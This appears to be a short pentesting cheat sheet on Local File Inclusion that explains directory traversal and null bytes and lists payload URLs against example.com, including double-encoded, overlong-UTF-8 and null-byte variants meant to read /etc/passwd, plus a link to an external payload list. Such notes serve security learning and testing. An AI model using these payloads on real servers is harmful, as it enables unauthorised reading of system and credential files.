# LFI
## Overview
[Good resource](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)

Local File Inclusion (LFI) occurs when an application loads or processes files using user-controlled input without proper validation. This can allow an attacker to access unintended files on the server.
LFI is commonly associated with dynamic file-loading functionality such as templates, language files, configuration files, and page routing systems.

LFI is a web application vulnerability that allows an attacker to access files stored on the server

example.com/index.php?page=etc/password

You can move up directories with ../../../../ -> example.com/index.php?page=./../../../etc/password

.. = parent directory

/ = directory separator

%00 = is a null byte, a special character that tells a computer, Stop reading here.

# PAYLOADS [link to payloads ](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
-  example.com/index.php?page=./../../../etc/password 
# ENCODEED PAYLOADS
-  http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
-  http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
-  http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
-  http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
